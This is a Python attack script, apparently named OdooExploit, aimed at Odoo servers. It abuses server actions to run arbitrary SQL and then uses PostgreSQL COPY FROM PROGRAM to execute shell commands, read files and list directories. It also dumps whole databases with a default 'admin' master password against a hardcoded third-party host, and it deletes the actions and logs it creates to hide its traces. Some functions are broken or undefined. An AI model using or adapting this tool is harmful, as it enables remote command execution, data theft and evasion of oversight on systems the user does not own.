import odoorpc
import uuid
import sys
import configparser
import http.client as http

_ConfigFileName = 'config.ini'
_params = ['auto'] 

def _help():
    print("OdooExploit parameter :")
    print(" server: Ip Address or hostname")
    print(" port: port number 8069 or other")
    print(" db: database name")
    print(" username: username of database")
    print(" password: passwrod of database")
    print(" Command:  ")
    print("     remember: remember connection parameters by name and load by config['name']")
    print("     dump: dump database")
    print("     sqli: execute sql script")
    print("     python: safe_eval python script")
    print("     sqli_databases: sqli get all databases") 
    print("     sqli_dir: sqli dir directory by pg_ls_dir(path |arg2,...)") 
    print("     sqli_readfile: sqli read file by pg_read_file(file |arg2,...)")
    print("     sqli_readfile2: sqli read file by copy TABLE From file |arg2,...)")
    print("     sqli_linuxread: sqli read file by linux shell")
    print("     sqli_winread: sqli read file by windows shell")
    print("     sqli_linuxdir: sqli directory list by linux shell")
    print("     sqli_windir: sqli directory list by windows shell")
    print("     sqli_linuxshell: sqli linux shell")
    print("     sqli_winshell: sqli windows shell")
    print(" Parameters: Command parameters")
    
def OdooExploit(_server,_port,_db,_username,_password,_cmd,_script):
    ###############################  methods  ###########################################
    print(_server + ':' + _port + ':' + _db + ':' + _username + ':' + _password + ':' + _cmd + ':' + script)

    odoo = odoorpc.ODOO(_server, protocol='jsonrpc', port=_port)
    def _connect():
        
        odoo.login(_db, _username, _password)
        
    def SQLI(script):
        _connect()
        #print("odoo connected.")
        uid = uuid.uuid4()
        actname = "sqli_" + uid.hex;
        _actions = odoo.env['ir.actions.server']
        _models = odoo.execute('ir.model','search',[('name','=','base')])
        #print("create and execute action :" + actname)
        #print(script)
        _modelId = 1#_models[0]
        _pyCode = "env.cr.execute(\""+script+"\") \ntry: rtn = env.cr.fetchall() \nexcept:rtn = 'no result data' \nif (not rtn): rtn ='execute compited' \nlog(rtn,'"+actname+"')"
        _id = _actions.create({'name': actname,'type': 'ir.actions.server','state': 'code','binding_type': 'action','model_id': _modelId, 'code':_pyCode})
        try:
            odoo.execute_kw("ir.actions.server","run",[_id])
            #print("execute action complited:" + actname)
        except Exception as err: 
            print("Error on execute action")
            print(err)
        odoo.execute('ir.actions.server','unlink',[_id])
        _logs = odoo.execute('ir.logging','search_read',[('level','=',actname)])
        _log_ids = []
        print("result: \n")
        for msg in _logs:
            print(msg['message'])
            _log_ids += [msg['id']] 
        odoo.execute('ir.logging','unlink',_log_ids)
        odoo.logout()
        
    def SQLI_LinuxDir(path):
        SQLI("DROP TABLE IF EXISTS ___files___AA_BB; CREATE TABLE ___files___AA_BB(filename text);COPY ___files___AA_BB FROM PROGRAM 'ls -a "+path+"'; SELECT * FROM ___files___AA_BB ORDER BY filename ASC;")
        
    def SQLI_WinDir(path):
        SQLI("DROP TABLE IF EXISTS ___files___AA_BB; CREATE TABLE ___files___AA_BB(filename text);")
        SQLI("COPY ___files___AA_BB FROM PROGRAM 'dir " + path + " \\\\n'; ")
        SQLI("SELECT * FROM ___files___AA_BB ORDER BY filename ASC;")
        #SQLI(script)
        
    def SQLI_Dir(path):
        SQLI("select * from pg_ls_dir('"+path.replace("\\","\\\\")+"',true,true) order by 1;")

    def SQLI_ReadFile(path):
        SQLI("select * from pg_read_file('"+path.replace("\\","\\\\")+"') order by 1;")
        
    def SQLI_ReadFile2(path):
        SQLI("DROP TABLE IF EXISTS ___docs___AA_BB; create table ___docs___AA_BB (data TEXT);")
        SQLI("copy ___docs___AA_BB from '"+path+"'; select * from docs limit 10;")
        
    def SQLI_LinuxRead(path):
        SQLI("DROP TABLE IF EXISTS ___files___AA_BB; CREATE TABLE ___files___AA_BB(filename text);COPY ___files___AA_BB FROM PROGRAM 'cat "+path+"'; SELECT * FROM ___files___AA_BB ORDER BY filename ASC;")

    def SQLI_LinuxShell(shellCommand):
        SQLI("DROP TABLE IF EXISTS ___Shell___AA_BB; CREATE TABLE ___Shell___AA_BB(filename text);COPY ___Shell___AA_BB FROM PROGRAM '"+shellCommand.replace("'","''").replace('"','""')+"'; SELECT * FROM ___Shell___AA_BB ORDER BY filename ASC;")
        
    def SQLI_Databases():
        SQLI("select datname from pg_database;")   
        
    
        
     
    ############################## Command Check body ############################### 
        
    if (cmd == "sqli"):
        SQLI(_script)
        
    if (cmd == "sqli_linuxdir"):
        SQLI_LinuxDir(_script)
        
    if (cmd == "sqli_windir"):
        SQLI_WinDir(_script)
        
    if (cmd == "sqli_dir"):
        SQLI_Dir(_script)
        
    if (cmd == "sqli_readfile"):
        SQLI_ReadFile(_script)        

    if (cmd == "sqli_readfile2"):
        SQLI_ReadFile2(_script)       
        
    if (cmd == "sqli_linuxread"):
        SQLI_LinuxRead(_script)       

    if (cmd == "sqli_databases"):
        SQLI_Databases()       

    if (cmd == "sqli_linuxshell"):
        SQLI_LinuxShell(_script)  
        
    if (cmd == "sqli_winshell"):
        SQLI_WinShell(_script)  

    if (cmd == "dump"):
        DumpDB(_script) 
        
    if (cmd == "remember"):
        RememberConfig(script) 
        
    if (cmd == "python"):
        print("python")

################################# Main Body to call methods #############################
def RememberConfig(params):
    if (len(params) < 7):
        _help();
    # Create the config
    config = configparser.ConfigParser()
    config.read(_ConfigFileName)
    
    sectionName = params[7]
    # Add a section
    if (not config.has_section(sectionName)):
        config.add_section(sectionName)

    # Add some options
    config.set(sectionName, 'server', params[2])
    config.set(sectionName, 'port', params[3])
    config.set(sectionName, 'db', params[4])
    config.set(sectionName, 'username', params[5])
    config.set(sectionName, 'password', params[6])
    
    # Write to file
    with open(_ConfigFileName, 'w') as configfile:
        config.write(configfile)
    print(sectionName + ' remembered.')  
    
def LoadConfig(sectionName):
    result = []
    # Create the config
    #print("load config from " + _ConfigFileName)
    config = configparser.ConfigParser()
    # Read from file
    config.read(_ConfigFileName)
    
    # Get a value from the config
    if (config.has_section(sectionName)):        
        result = ['LoadConfig',config.get(sectionName, 'server'),config.get(sectionName, 'port'),config.get(sectionName, 'db'), config.get(sectionName, 'username'), config.get(sectionName, 'password')]
    return result
    
def DumpDB(params):
    server = params[2]
    port = params[3]
    db  = params[4]
    filname = params[5]
    super_admin_passwd  = "admin"
    if (len(params) > 6 and params[6] == ""):
        super_admin_passwd = params[6]
    #odoo = odoorpc.ODOO(server, port=port)
    odoo = odoorpc.ODOO("elearning.sotatek.com",port=443)
    print("start dump database")
    http.HTTPConnection._http_vsn = 10
    http.HTTPConnection._http_vsn_str = 'HTTP/1.0'
    timeout_backup = odoo.config['timeout']
    odoo.config['timeout'] = 6000    # Timeout set to 100 minutes
    dump = odoo.db.dump(super_admin_passwd, db)   
    odoo.config['timeout'] = timeout_backup   
    with open(filname, 'wb') as dump_zip:
        dump_zip.write(dump.read())    

if (len(sys.argv) < 2):
    _help()
elif (sys.argv[1] == "dump"): 
    DumpDB(sys.argv)
elif (sys.argv[1] == "remember"): 
    RememberConfig(sys.argv)
elif (len(sys.argv) > 6):
    _params = sys.argv
elif (len(sys.argv) < 6):
    _conf = []
    _conf = LoadConfig(sys.argv[1])
    if (len(_conf) > 4):
        _params = _conf
        if (len(sys.argv) > 2):
            _params.append(sys.argv[2])
        if (len(sys.argv) > 3):        
            _params.append(sys.argv[3])
    else:
        _help()

print(_params)

if (len(_params) > 4):
    #print(_params)
    server = _params[1]
    port = _params[2]
    db = _params[3]
    username = _params[4]
    password = _params[5]
    cmd = _params[6]
    if (len(_params) > 7):
        script = _params[7]
    else: script = ''


    OdooExploit(server,port,db,username,password,cmd,script)

#current User : select format('Database: %s, User: %s',current_database(),user) db_details
